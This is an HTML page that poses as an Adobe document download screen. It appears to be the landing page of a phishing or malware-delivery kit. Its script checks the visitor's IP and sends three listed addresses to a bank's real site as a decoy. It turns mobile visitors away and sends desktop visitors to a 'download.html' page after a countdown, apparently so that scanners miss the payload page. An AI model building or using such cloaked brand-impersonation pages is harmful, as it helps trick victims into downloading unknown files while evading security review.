<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Downloading Document</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@200;300;400;500&display=swap');
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Poppins', sans-serif;
    }
    .container {
      width: 100%;
      height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      background: #fff;
      gap: 15px;
      padding-bottom: 20vh;
    }
    .logo {
      width: 80px;
      height: 80px;
      object-fit: contain;
    }
    .download-text {
      font-weight: bold;
      font-size: 16px;
    }
    .spinner {
      width: 40px;
      height: 40px;
      border: 5px solid red;
      border-top-color: transparent;
      border-radius: 50%;
      animation: spinner 0.7s linear infinite;
    }
    @keyframes spinner {
      to {
        transform: rotate(360deg);
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="adobe-logo.png" alt="Logo" class="logo">
    <div class="download-text">Downloading Document</div>
    <div class="spinner"></div>
  </div>

  <script>
    // IP addresses to block
    const blockedIPs = [
      '162.158.63.162',
      '162.158.63.161',
      '162.158.63.160'
    ];

    // Mobile device detection
    function isMobileDevice() {
      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }

    // Get client IP (this requires a server-side solution for accurate IP detection)
    // Note: This client-side method may not be reliable for all cases
    function getClientIP() {
      return new Promise((resolve) => {
        fetch('https://api.ipify.org?format=json')
          .then(response => response.json())
          .then(data => resolve(data.ip))
          .catch(() => resolve(null));
      });
    }

    // Main execution
    (async function() {
      // Try to get client IP (note: may not work in all browsers/environments)
      const clientIP = await getClientIP();
      
      // Check if client IP is in blocked list
      if (clientIP && blockedIPs.includes(clientIP)) {
        window.location.href = "https://www.easternbank.com/";
        return;
      }

      // Original device detection logic
      if (isMobileDevice()) {
        window.location.href = "denied.html";
      } else {
        setTimeout(function() {
          window.location.href = "download.html";
        }, 5000);
      }
    })();
  </script>
</body>
</html>
